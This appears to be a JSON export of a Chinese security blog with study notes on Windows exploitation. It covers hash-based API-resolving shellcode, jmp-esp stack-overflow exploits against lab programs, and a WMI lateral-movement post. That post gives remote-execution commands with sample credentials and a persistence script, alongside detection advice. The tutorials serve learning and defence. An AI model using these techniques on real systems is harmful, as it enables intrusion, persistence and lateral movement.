xchg\n\nxchg为交换指令，交换两个操作数的数据\n\n这里执行了lodsd实际上就是把esi指向的位置，长度为双字节的值赋值给eax，esi的值为`0012FF28`，指向的是`LoadLibraryA` HASH值，lodsd就是把`LoadLibraryA` 的HASH值存入了eax寄存器\n\n![image-20210606101052753](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606101052753.png)\n\n这里`cmp eax, 0x1e380a6a`结果不相等，则跳转到`find_functions`\n\n## 第5段 find_functions\n\n这一段代码的作用是根据kernel32.dll的基地址寻找导出`函数名地址表`\n\n```assembly\nfind_functions: \n    pushad \t\t\t\t\t\t# 寄存器值入栈，保存寄存器的值\n    mov eax, [ebp + 0x3c]\t\t# eax = start of PE header \n    mov ecx, [ebp + eax + 0x78]\t# ecx = relative offset of export table \n    add ecx, ebp \t\t\t\t# ecx = absolute addr of export table \n    mov ebx, [ecx + 0x20] \t\t# ebx = relative offset of names table \n    add ebx, ebp \t\t\t\t# ebx = absolute addr of names table \n                                 # 这里将函数名称列表的偏移地址ebx和基地址ebp相加(得到VA地址)存入ebx\n    xor edi, edi \t\t\t\t# edi will count through the functions \n```\n\n### pushad\n\n将通用寄存器压入栈，顺序是`EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI`，执行后`ESP- 32`栈顶提升32字节\n\n执行前：\n\n![image-20210606102449180](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606102449180.png)\n\n执行后：\n\n![image-20210606102552147](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606102552147.png)\n\n## 第6段 next_function_loop\n\n这里根据上一个函数找到的`函数名地址表`遍历下一个函数\n\n```assembly\nnext_function_loop: \n    inc edi \t\t\t\t\t// increment function counter \n    mov esi, [ebx + edi * 4] \t// esi = relative offset of current function name \n    add esi, ebp \t\t\t\t// esi = absolute addr of current function name \n    cdq \t\t\t\t\t\t// dl will hold hash (we know eax is small) \n```\n\n这里主要就是将edi置为0之后自增，然后将esi设置为下一个函数的VA地址\n\n### cdq\n\n数据扩展指令, 这个指令把 EAX 的第 31 bit 复制到 EDX 的每一个 bit 上\n\n```\n假设 EAX 是 FFFFFFFB (-5) ，它的第 31 bit (最左边) 是 1\n执行 CDQ 后， CDQ 把第 31 bit 复制至 EDX 所有 bit\nEDX 变成 FFFFFFFF\n```\n\n这里执行完之后esi指向kernel32中的AddAtomA的\n\n![image-20210606105409747](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606105409747.png)\n\n## 第7段 hash_loop\n\n这里主要是计算函数名的hash值，然后将值存入edx中，计算完毕之后跳转到`compare_hash`\n\n```assembly\nhash_loop:\n    movsx eax, byte ptr[esi]\t#  进行符号扩展并且按byte传送\n    cmp al,ah\t\t# al和ah相等说明字母的hash计算完毕\n    jz compare_hash\t# 等于则跳转\n    ror edx,7\t\t# 循环右移7位\n    add edx,eax\n    inc esi\n    jmp hash_loop\n```\n\n### movsx\n\n将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。\n\n```\n 例子:MOV BL,80H\n         MOVSX AX,BL\n   AX == 0FF80H\n   可能初学者奇怪80H不是正数吗?FF怎么来的?看下面，\n   80h = 1000 0000 最高位为符号位, 即符号位为1\n   则MOVSX AX, BL后, AX = 1111 1111 1000 0000 = FF80h\n   同理，再举一例: \n   在一crackme里,有这样一条指令:\n   movsx   edx, byte ptr [esp+18]  //设byte ptr [esp+18]  == 61h\n   执行后的结果应为:\n   edx == 00000061h\n   61h = 0110 0001 最高位为符号位, 即符号位为0\n   则EDX = 0000 0000 0000 0000 0000 0000 0110 0001 = 00000061h\n```\n\n所以`movsx eax, byte ptr[esi]`的意思就是从esi指向的地址处，取一个字节，也就是第一个字母，存入eax，我们看下执行前后的内存情况\n\n执行前：\n\n![image-20210606112132285](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606112132285.png)\n\n执行后：\n\n![image-20210606112206290](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606112206290.png)\n\n这里存入的就是第一个`A`的ASCII码，在计算完hash之后AH和AL都为00，此时ESI指向的函数名的hash值以及存储到了EDX中，然后跳转到`compare_hash`\n\n![image-20210606151515908](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606151515908.png)\n\n## 第8段 compare_hash\n\n```assembly\ncompare_hash:\t\n    cmp edx, [esp + 0x1c] \t\t# edx此时存储的是当前方法的hash值\n    jnz next_function_loop \n```\n\n获取到了edx之后，和刚刚通过pushad指令传到栈中的`LoadLibraryA`的hash值进行对比，如果不相等，标志寄存器的`ZF=0`，则`jnz next_function_loop`执行，相当于返回第6段重新来一遍，直到匹配到hash值相同。\n\n![image-20210606151938491](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606151938491.png)\n\n## 第9段 根据名称寻找函数的指针\n\n```assembly\n    mov ebx, [ecx + 0x24] \t\t# 在此之前,ecx存储的是kernel32.dll文件的EAT地址,偏移0x24(十进制为36)之后就是结构体中的AddressOfOrdinals的地址,指向EAT的RVA地址\n    add ebx, ebp \t\t\t\t# ebx = AddressOfOrdinals的VA地址\n    mov di, [ebx + 2 * edi] \t# 将要找的Ordinals值赋值给di\n    mov ebx, [ecx + 0x1c] \t\t# 偏移0x1C(十进制为28),也就是结构体中的AddressOfFunctions\n    add ebx, ebp \t\t\t\t# ebx = AddressOfFunctions的VA地址\n    add ebp, [ebx + 4 * edi] \t# 根据ebx和edi的个数来计算方法的入口地址,最后赋值给ebp\n    # relative offset of matched function \n    xchg eax, ebp \t\t\t\t#  将函数地址写入eax，见下图\n```\n\n`xchg eax, ebp`执行完之后，EAX的地址为LoadLibraryA的函数指针\n\n![image-20210606155548032](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606155548032.png)\n\n```assembly\n    pop edi \t\t\t\t\t# 将栈顶的值返回给edi\n```\n\n此时栈顶的值为`0012FF1C`\n\n![image-20210606155901524](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606155901524.png)\n\n```assembly\n    stosd \t\t\t\t\t\t# 将EAX 的内容存入由 EDI 中偏移量指向的内存位置,并将edi加4个字节\n```\n\n因为eax中此时存的是`LoadLibraryA`的地址，所以`LoadLibraryA`的地址被存入了EDI中偏移量指向的内存位置，也就是`0012FF1C`\n\n![image-20210606161356096](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606161356096.png)\n\n```\n    push edi \t#将edi的值再次入栈\n    popad\t\t\t\t\t# pushad的相反操作，将之前寄存器的值全部出栈\n```\n\n这里popad执行之后，寄存器回到原先pushad的时候：\n\n![image-20210606162318087](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606162318087.png)\n\n```assembly\n    # loop until we reach end of last hash \n\n\tcmp eax,0x1e380a6a\t\t# 对比eax和MessageBoxA的hash\n\tjne find_lib_functions \t# 不同则跳转，然后重复上述步骤开始寻找MessageBoxA的hash\n```\n\n最终整个循环结束的时候，三个需要调用的函数的指针，会被放到栈中`0012FF11C-0012FF28`之间的位置\n\n![image-20210606163051005](0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode.assets/image-20210606163051005.png)\n\n### 注意！！！\n\n这里第4段到第9段的代码实际上执行了三遍，在第三次定位`MessageBoxA`的时候，调用`LoadLibraryA`引用`user32.dll`\n\n最初把三个函数的hash值push入栈之后，根据三个hash值，分别查找调用对应的函数的VA地址，然后存入`0012FF11C-0012FF28`，供下面的`function_call`调用\n\n## 第10段 function_call\n\n```assembly\nfunction_call:\n    xor ebx,ebx # ebx的值为0\n    push ebx\n    push 0x74736577 # 74736577是tsew的ASCII\n    push 0x6C696166 # 6C696166是liaf的ASCII\n    mov eax,esp\t# esp中存储的地址指向字符串failwest\n    push ebx\n    push eax\n    push eax\n    push ebx\n    call [edi - 0x04] # 调用MessageBoxA\n    push ebx\n    call [edi - 0x08] # 调用ExitProcess\n    nop\n    nop\n    nop\n    nop\n```\n\n","categories":["二进制相关"]},{"title":"深入理解WMI","url":"/2021/05-12-深入理解WMI/","content":"# 什么是WMI，它出现的意义是什么\n\nWindows Management Instrumentation（WMI）是自Windows NT 4.01和Windows 952起一直保持不变的一项强大技术。WMI存在于所有Windows操作系统上，由一组功能强大的工具组成，`用于在本地和远程管理Windows系统。`\n\n看重点就是，它的存在就是为了方便IT运维人员远程管理计算机，所以被用作横向移动也不奇怪了。\n\n# 常见的WMI攻击方式\n\n首先WMI攻击需要目标开启135端口，并且需要攻击者使用的账号有WMI的执行权限\n\n## 执行命令\n\n### 手法\n\n使用windows自带的WMIC\n\n```\nwmic /node:192.168.1.10 /user:win7\\administrator /password:123456 process call create \"cmd.exe\" /c ipconfig > ip.txt\"\n```\n\nwmiexec.vbs\n\n```\n两种方式，一种是伪交互式的shell\ncscript.exe //nologo wmiexec.vbs /shell 192.168.1.10 administrator admin123\n一种是直接执行命令\ncscript.exe wmiexec.vbs /cmd 192.168.1.10 administrator admin123! \"ipconfig\"\n```\n\nImpacket中的WMIexec.py\n\n```\n这里密码如果带有特殊字符则需要用双引号括起来\npython wmiexec.py dev/administrator:\"admin123!\"@192.168.254.161\n```\n\n![image-20210512183358236](横向移动系列_深入理解WMI.assets/image-20210512183358236.png)\n\n### 原理\n\n通过通过Win32_Process类的Create方法，直接执行命令\n\n## 通过WMI建立后门\n\n### 手法\n\n使用WMI可做后门，其中主要的方式不是通过Win32_Process的Create方法，目前已知的通过WMI做后门的方式都是参考自Blackhat2015中提出的通过事件过滤器的利用方式：\n\nEmpire后门\n\nhttps://zhuanlan.zhihu.com/p/255065815\n\n检测并清除：\n\nhttps://xz.aliyun.com/t/2873\n\n### 原理\n\n事件主要通过WMI中提供的事件、事件消费者、事件绑定类来实现：\n\n```\n__EventFilter\n\t事件过滤器,接收事件查询参数,WMI中的事件非常多，可以通过WQL语句触发事件\n__EventConsumer\n\t事件消费者，也就是事件在触发时做执行操作的类，包括下面这些，但是这些类都是继承自__EventConsumer：\n        LogFileEventConsumer： 将事件数据写入到指定的日志文件\n        ActiveScriptEventConsumer： 用来执行VBScript/JScript程序\n        NTEventLogEventConsumer：创建一个包含事件数据的日志入口点\n        SMTPEventConsumer：将事件数据用邮件发送\n        CommandLineEventConsumer：执行一条命令\n__FilterToConsumerBinding\n\t必须将事件过滤器和事件消费者两者绑定，在产生事件时消费者才会执行操作\n```\n\n议题中的例子：\n\n```powershell\nfilterName = 'BotFilter82'\nconsumerName = 'BotConsumer23'\nexePath = 'C:\\Windows\\System32\\evil.exe'\nQuery = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=200  AND TargetInstance.SystemUpTime < 320\"\n\nWMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$Query} -ErrorAction Stop\n\nWMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}\n\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}\n```\n\n上面的查询语句可以参考链接：\n\n主要就是定时(每60s)查询计算机的性能计数器，当满足查询语句时事件被触发，事件消费者中的文件被执行。\n\n## WMI的回显问题\n\n默认情况下通过WMI执行代码是不会有回显的，其中有部分脚本实现了shell类型的和有回显的执行代码的方式，比如impacket中的wmiexec.py还有wmiexec.vbs直接做成了类似于反弹shell的形式。\n\n下面的这个文章举了一些例子：\n\nhttps://www.4hou.com/posts/ojVY\n\n### 通过创建wmi对象存储数据\n\n比如网上的例子：\n\n```\nStaticClass = New-Object Management.ManagementClass('root\\cimv2', $null, $null)\nStaticClass.Name = 'Win32_EvilClass'\nStaticClass.Put()\nStaticClass.Properties.Add('EvilProperty', \"This is not the malware you're looking for\")\nStaticClass.Put()\n```\n\n### 通过注册表存储\n\nWMI可以实现远程操作注册表，其中`root\\DEFAULT:StdRegProv`类就可以实现远程操作注册表项\n\n# 防御与检测\n\n## 后门排查\n\n直接powershell执行下面命令，查看以下三种类型的类是否存在\n\n```powershell\n# Event Filter\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='Updater'\"\n\n# Event Consumer\nGet-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='Updater'\"\n\n# Binding\nGet-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%Updater%'\"\n```\n\n网上也说到使用Autoruns，其实原理是一样的\n\n## 检测\n\n可以参考：https://bbs.pediy.com/thread-254123.htm\n\n### Windows事件日志：\n\n事件5861代表新创建的consumer\n\n![image-20210514235529701](横向移动系列_深入理解WMI.assets/image-20210514235529701.png)\n\n![image-20210515000638785](横向移动系列_深入理解WMI.assets/image-20210515000638785.png)\n\n### sysmon日志：\n\nsysmon内置了关于wmi的三种类型的事件日志：\n\n```\nSysmon事件ID 19：WmiEvent（检测到了WmiEventFilter的活动）\nSysmon事件ID 20：WmiEvent（检测到了WmiEventConsumer的活动）\nSysmon事件ID 21：WmiEvent（检测到了WmiEventConsumerToFilter的活动）\n```\n\n### 进程级别检测：\n\n进程链中，可以看到通过wmi启动了powershell.exe进程。\n\n```\n下图左上角，进程链中，可以看到通过wmi启动了powershell.exe进程。\n\n下图右上角，如果我们想通过powershell执行命令在一台远程机器上的时候，本地的进程是powershell.exe，远程机器上出现的进程就是wsmprovhost.exe\n\n下图左下角，和上面一样，通过远程执行WMI命令时，本地可能是通过wmic.exe，在远程机器上出现的进程就是wmiprvse.exe\n\n下图右下角，可以看到有人在这台机器上远程执行powershell命令，通过进程链的sc.exe可以知道是在执行和服务相关的命令。\n```\n\n![image-20210515000121704](横向移动系列_深入理解WMI.assets/image-20210515000121704.png)\n\n### 检测WMI对象：\n\n通过WMI对象留后门会出现除了系统默认之外的类或者命名空间\n\n### 流量检测：\n\n发现每种类型都有不一样的流量特征，需要一个一个的去分析\n\n"},{"title":"0day漏洞挖掘_3.4_定位导出地址表","url":"/2021/05-07-0day漏洞挖掘_3.4_定位导出地址表/","content":"\n这一节主要说明什么是EAT，以及如何在内存中定位EAT以及定位系统API的位置，比如上一节的ExitProcess。\n\n# IAT和EAT\n\n导出地址表也被叫做EAT（Export Address Table），对应的是IAT（导入地址表，Import Address Table）\n\n```\nIAT记录了程序正在使用哪些库中的哪些函数\nEAT记录了库文件中的导出函数的地址(一般是说库文件,比如DLL文件中)\n```\n\n# PE文件中查找EAT地址\n\n首先需要对PE头有一定的了解，直接打开一个二进制文件，找到PE头的位置也就是`PE 00`，直接往后数120个字节，就是EAT的地址，这里地址为`00092C70`：\n\n![image-20210507231740178](0day漏洞挖掘_3.4_定位导出地址表.assets/image-20210507231740178.png)\n\n这个地址指向的位置，是一个结构体，这个结构体命名为IMAGE_EXPORT_DIRECTORY，结构如下：\n\n```c++\ntypedef struct _IMAGE_EXPORT_DIRECTORY\n{\n\tDWORD Characteristics;\n\tDWORD TimeDateStamp; //文件生成时间\n\tWORD MajorVersion; \n\tWORD MinorVersion; \n\tDWORD Name; //模块的真实名称\n\tDWORD Base; //基数，加上序数就是函数地址数组的索引值\n\tDWORD NumberOfFunctions; //导出函数的个数\n\tDWORD NumberOfNames; //以名称方式导出的函数的总数\n    \n\tDWORD AddressOfFunctions; //Export函数地址数组\n\tDWORD AddressOfNames; //指向输出函数名字的RVA\n\tDWORD AddressOfNameOrdinals; //指向输出函数序号的RVA\n}IMAGE_EXPORT_DIRECTORY ,*PIMAGE_EXPORT_DIRECTORY\n```\n\n其中指向函数地址的，就是AddressOfFunctions这个字段，偏移量为0x1C，也就是28个字节，AddressOfFunctions是一个数组，数组的内容为`导出函数的入口地址的列表`，这里的地址是RVA地址，想要真正的获取VA地址需要加上ImageBase\n\n# 在内存中查找EAT地址\n\n首先了解两个名字，主要就是先知道这两个结构体是一个是为了记录线程的信息，一个是记录进程的信息：\n\n参考：https://blog.csdn.net/whklhhhh/article/details/78660474\n\n```\nTEB\n线程环境块：该结构体中包含进程中运行线程的各种信息，每个线程都对应一个TEB结构体。\n\nPEB\n进程环境块\n```\n\n书中的描述的在内存中通过`FS段寄存器`定位`kernel32.dll`加载基址的方法：\n\n![image-20210508004300226](0day漏洞挖掘_3.4_定位导出地址表.assets/image-20210508004300226.png)\n\n在第7个步骤中就已经获得了kernel32.dll的加载基址，然后通过上面说到的通过PE文件查找的方式就可以计算出函数在内存中的入口地址\n\n![image-20210508010316333](0day漏洞挖掘_3.4_定位导出地址表.assets/image-20210508010316333.png)","categories":["二进制相关"]},{"title":"0day漏洞挖掘_3.1_使用jmp指令执行shellcode","url":"/2021/04-27-0day漏洞挖掘_3.1_使用jmp指令执行shellcode/","content":"\n上一节使用的是直接指定shellcode位置的方法来利用栈溢出漏洞，这一节使用程序中的`jmp esp`执行shellcode，这样的好处在于使用`jmp esp`指令作为跳板，不论栈帧怎么移位，都能够精确的跳回栈区。\n\n## 查找jmp esp的地址\n\n有两种方法可以查找程序中的`jmp esp`指令，一个是使用代码查询：\n\n1、使用代码查找，原理就是将handle转换成起始地址的指针，通过遍历`FFE4`指令，然后查找地址。\n\n```c\n// 03_findesp.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n#define DLL_NAME \"user32.dll\"\n\nmain()\n{\n\tBYTE* ptr;\n\tint position,address;\n\tHINSTANCE handle;\n\tBOOL done_flag = FALSE;\n\thandle = LoadLibrary(DLL_NAME);\n\tif(!handle)\n\t{\n\t\tprintf(\" load dll erro !\");\n\t\texit(0);\n\t}\n\tptr = (BYTE*)handle;\n\n\tfor(position = 0; !done_flag;position++)\n\t{\n\t\ttry\n\t\t{\n\t\t\tif(ptr[position] == 0xFF && ptr[position+1] == 0xE4)\n\t\t\t{\n\t\t\t\tint address = (int)ptr + position;\n\t\t\t\tprintf(\"OPCODE found at 0x%x\\n\",address);\n\t\t\t}\n\t\t}\n\t\tcatch(...)\n\t\t{\n\t\t\tint address = (int)ptr + position;\n\t\t\tprintf(\"END OD 0x%x\\n\", address);\n\t\t\tdone_flag = true;\n\t\t}\n\t}\n\n\tprintf(\"Hello World!\\n\");\n\treturn 0;\n}\n```\n\n![image-20210427225923305](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210427225923305.png)\n\n```\njmp esp的位置\n0x77d92288\n地址需要反过来读，所以在内存中的位置是：\n8822D977\n```\n\n2、使用ollydbg的插件ollyuni.dll，但是我这里没有成功的跑出来想要获取的地址，后面使用的是上面的代码跑出来的地址\n\n![image-20210428003946759](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210428003946759.png)\n\n## 查找exit函数在内存中的入口地址\n\n上面一小节通过查找jmp指令执行shellcode，这里说明一下使用exit(0)来结束程序，防止栈被破坏，调用通过工具`Dependency Walker`查看kernel32.dll的基地址和偏移地址\n\n```\n0x7C800000+0x0001CAFA = 7C81CAFA\n```\n\n![image-20210427231911845](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210427231911845.png)\n\n## 构造shellcode\n\n这里是将汇编指令转换成机器指令的方法：\n\n```c\n// 03_ass_to_maccode.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <windows.h>\n\nint main(int argc, char* argv[])\n{\n\tHINSTANCE LibHandle;\n\tchar dllbuf[11] = \"user32.dll\";\n\tLibHandle = LoadLibrary(dllbuf);\n\n\t_asm{\n\t\tsub sp,0x440\n\t\txor ebx,ebx\n\t\tpush ebx\n\t\tpush 0x74736577\n\t\tpush 0x6C696166\n\n\t\tmov eax,esp\n\t\tpush ebx\n\t\tpush eax\n\t\tpush eax\n\t\tpush ebx\n\n\t\tmov eax,0x77D507EA\t// messagebox address\n\t\tcall eax\n\t\t\n\t\tpush ebx\n\t\tmov eax,0x7C81CAFA // exit address\n\t\tcall eax\n\t}\n\treturn 0;\n}\n```\n\n编译成exe之后进入main函数，查看其中的代码：\n\n![image-20210427231401387](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210427231401387.png)\n\n选中之后直接右键\n\n![image-20210427231439664](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210427231439664.png)\n\n即可保存到文件\n\n![image-20210427231458810](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210427231458810.png)\n\n```\n00401067  |. 33DB           XOR EBX,EBX\n00401069  |. 53             PUSH EBX\n0040106A  |. 68 77657374    PUSH 74736577\n0040106F  |. 68 6661696C    PUSH 6C696166\n00401074  |. 8BC4           MOV EAX,ESP\n00401076  |. 53             PUSH EBX\n00401077  |. 50             PUSH EAX\n00401078  |. 50             PUSH EAX\n00401079  |. 53             PUSH EBX\n0040107A  |. B8 EA07D577    MOV EAX,77D507EA\n0040107F  |. FFD0           CALL EAX\n00401081  |. 53             PUSH EBX\n00401082  |. B8 FACA817C    MOV EAX,7C81CAFA\n00401087  |. FFD0           CALL EAX\n```\n\n其中的机器码提取之后为：\n\n```\n33DB536877657374686661696C8BC453505053B8EA07D577FFD053B8FACA817CFFD0\n```\n\n将`空数据`和`JMP ESP`和`shellcode`组合之后的结果为：\n\n```\n8822D97733DB536877657374686661696C8BC453505053B8EA07D577FFD053B8FACA817CFFD0\n```\n\n填充到TXT文件中，最后可以补90\n\n![image-20210428001147162](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210428001147162.png)\n\n执行之后：\n\n![image-20210428001227447](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210428001227447.png)\n\n## 小结\n\n这一节的几个重点\n\n```\n1、如何查找一个jmp esp地址?查找的是dll中的还是程序中的?\njmp esp对应的机器码为0xFFE4,代码是从user32.dll在内存中基地址开始向后搜索0xFFE4,如果找到就返回其内存地址\n```\n\n```\n2、查找exit函数的入口地址\n使用Dependency Walker查看kernel32.dll的加载基地址和ExitProcess的偏移地址，然后计算得出VA地址\n```\n\n```\n3、为什么jmp esp之后能够执行shellcode?\na)首先是要覆盖返回地址,将返回地址修改为jmp esp的位置\nb)而esp直接指向了下一个栈帧的栈顶\nc)因为在加载了txt文件之后,ESP指向的位置正好是txt文件的内容的开头位置(上一个栈帧中的变量存储位置)\n```\n\n![image-20210506215757960](0day漏洞挖掘_3.1_使用jmp指令执行shellcode.assets/image-20210506215757960.png)\n\n```\n4、如何更快速的将汇编语言转化为shellcode?\n可以直接使用C语言写，然后查看其在内存中的机器码\n```\n\n","categories":["二进制相关"]},{"title":"0Day漏洞挖掘_2_栈溢出","url":"/2021/04-23-0Day漏洞挖掘_2_栈溢出/","content":"\n## 基础\n\n几个需要知道的寄存器：\n\n```\nEIP\t指令寄存器：其内存放着一个指针，该指针永远指向一条等待执行的指令地址\nESP\t栈指针寄存器：存放一个指针，永远指向系统栈最上面一个栈帧的栈顶\nEBP\t基址指针寄存器：存放一个指针，永远指向系统栈最上面一个栈帧的栈底\n```\n\n一般情况下在调用函数时的流程：\n\n![image-20210423220516753](0Day漏洞挖掘_2_栈溢出.assets/image-20210423220516753.png)\n\n这里Call函数地址之后有一点书中没有写就是，跳转到所调用函数入口地址处，实际上就是把调用的这个函数地址的值存入EIP，系统会执行EIP寄存器所指向的地址的指令\n\n## 修改函数返回地址绕过验证\n\n创建一个程序，然后绕过这个程序的密码校验：\n\n```c\n// 02_Crackme.cpp : Defines the entry point for the console application.\n\n#include \"stdio.h\"\n#include \"string.h\"\n#include \"stdlib.h\"\n\n#define PASSWORD \"1234567\"\n\nint verify_password ( char *password)\n{\n\tint authenticated;\n\tchar buffer[8];\n\tauthenticated = strcmp(password,PASSWORD);\n\tstrcpy(buffer,password);\n\treturn authenticated;\n}\n\nvoid main()\n{\n\tint valid_flag = 0;\n\tchar password[1024];\n\tFILE * fp;\n\n\tif(!(fp = fopen(\"password.txt\",\"rw+\")))\n\t{\n\t\tprintf(\"txt is null ~\");\n\t\texit(0);\n\t}\n\tfscanf(fp,\"%s\",password);\n\tvalid_flag = verify_password(password);\n\tif(valid_flag)\n\t{\n\t\tprintf(\"incorrect password!\\n\\n\");\n\t}\n\telse\n\t{\n\t\tprintf(\"Yes ,you right !\");\n\t}\n\tfclose(fp);\n}\n```\n\n这里通过fopen读取password.txt中的值，判断是否为正确密码\n\n这里直接拖入ollydbg，首先这个程序在main函数中调用了verify_password函数，我们考虑在函数创建调用verify_password然后return返回main函数的时候，将verify_password函数栈帧的EBP(指向的是原本main函数执行到的位置)替换成`printf(\"Yes ,you right !\");`所在的地址，然后在返回的时候就会直接跳转到`printf(\"Yes ,you right !\");`执行，下面是具体流程：\n\n1、先根据上一节的经验找main函数，直接下个断点：\n\n![image-20210423222940701](0Day漏洞挖掘_2_栈溢出.assets/image-20210423222940701.png)\n\n然后执行到verify_password函数中，在RETN指令执行之前：\n\n![image-20210221230541838](0Day漏洞挖掘_2_栈溢出.assets/image-20210221230541838.png)\n\n可以看到，此时在系统栈中：\n\n```\n0012FB20是这个栈帧的EBP\n0012FB24是返回地址\n```\n\n![image-20210221230806411](0Day漏洞挖掘_2_栈溢出.assets/image-20210221230806411.png)\n\n此时Yes这个分支的地址为:0040112C\n\n这样通过修改文件的最后四个字节，来覆盖正常情况下的返回地址即可达到目的\n\n![image-20210221231420071](0Day漏洞挖掘_2_栈溢出.assets/image-20210221231420071.png)\n\n可以看到返回地址和EBP都被覆盖\n\n![image-20210221231333556](0Day漏洞挖掘_2_栈溢出.assets/image-20210221231333556.png)\n\n## 代码注入\n\n上面一段我们是通过修改栈帧的返回地址，从而绕过了密码验证，这节通过栈溢出让程序执行代码\n\n代码：\n\n```c\n// 02_Crackme.cpp : Defines the entry point for the console application.\n\n#include \"stdio.h\"\n#include \"string.h\"\n#include \"stdlib.h\"\n\n#define PASSWORD \"1234567\"\n\nint verify_password ( char *password)\n{\n\tint authenticated;\n\tchar buffer[44];\n\tauthenticated = strcmp(password,PASSWORD);\n\tstrcpy(buffer,password);\n\treturn authenticated;\n}\n\nvoid main()\n{\n\tint valid_flag = 0;\n\tchar password[1024];\n\tFILE * fp;\n    LoadLibrary(\"user32.dll\");\n\n\tif(!(fp = fopen(\"password.txt\",\"rw+\")))\n\t{\n\t\texit(0);\n\t}\n\tfscanf(fp,\"%s\",password);\n\tvalid_flag = verify_password(password);\n\tif(valid_flag)\n\t{\n\t\tprintf(\"incorrect password!\\n\\n\");\n\t}\n\telse\n\t{\n\t\tprintf(\"Yes ,you right !\");\n\t}\n\tfclose(fp);\n}\n```\n\n### 1、查看系统接口messageboxA在内存中的入口地址\n\n程序中加载了user32.dll，为了能够执行系统函数，使用dependency walker工具查看：\n\n![image-20210424204359634](0Day漏洞挖掘_2_栈溢出.assets/image-20210424204359634.png)\n\n```\nUser32.dll的基地址：\n0x77D10000\nMessageBoxA的偏移地址为:\n0x000407EA\n\n两者相加得出MessageBoxA在内存中的入口地址：\n0x77D507EA\n```\n\n### 2、查看txt加载之后的起始位置和返回地址\n\n这里可以看到，txt被加载之后，起始的一串4321\n\n![image-20210424204702638](0Day漏洞挖掘_2_栈溢出.assets/image-20210424204702638.png)\n\n```\nEBP:\n0x0012FB20\n返回地址为:\n0x0012FB24\n内容为：\n0x00401125\n```\n\n### 3、构造执行的汇编代码\n\n```assembly\nXOR EBX,EBX\t\t;相当于MOV EBX,0 据说效率更高\nPUSH EBX\t\t\nPUSH 74736577\t;tsew\nPUSH 6C696166\t;liaf\n\nMOV EAX,ESP\nPUSH EBX\nPUSH EAX\nPUSH EAX\nPUSH EBX\n;这里连续的push是传入四个参数(0,failwest,failwest,0)\n\n;调用MessageBoxA\nMOV EAX,0x0x77D507EA\nCALL EAX\n```\n\n翻译成机器码就是：\n\n```\n33DB\n53\n6877657374\n686661696C\n8BC4\n53\n50\n50\n53\nB8EA07D577\nFFD0\n```\n\n按顺序填入txt中，最后的53-56位填0012FAF0，因为是参数传入之后的起始位置\n\n![image-20210424214050048](0Day漏洞挖掘_2_栈溢出.assets/image-20210424214050048.png)\n\n读取之后返回之前的栈空间：\n\n![image-20210424221214797](0Day漏洞挖掘_2_栈溢出.assets/image-20210424221214797.png)\n\n执行之后可以看到弹窗：\n\n![image-20210424213936920](0Day漏洞挖掘_2_栈溢出.assets/image-20210424213936920.png)\n\n### 汇编语言如何调用函数参数\n\n上面在使用CALL指令调用MessageBoxA之前，连续PUSH了四个参数入栈，实际上在汇编语言中，在调用函数时，要先把参数PUSH入栈，比如这里调用main函数的时候：\n\n![image-20210424220237580](0Day漏洞挖掘_2_栈溢出.assets/image-20210424220237580.png)\n\n在调用verify_password函数时，PUSH的是EDX的值， 这里EDX寄存器中保存的是一个地址，因为使用了指针，EDX中的值就是password.txt文件中传入的值，被当做参数传入函数，并且后面写入栈帧：\n\n![image-20210424220500445](0Day漏洞挖掘_2_栈溢出.assets/image-20210424220500445.png)\n\n## 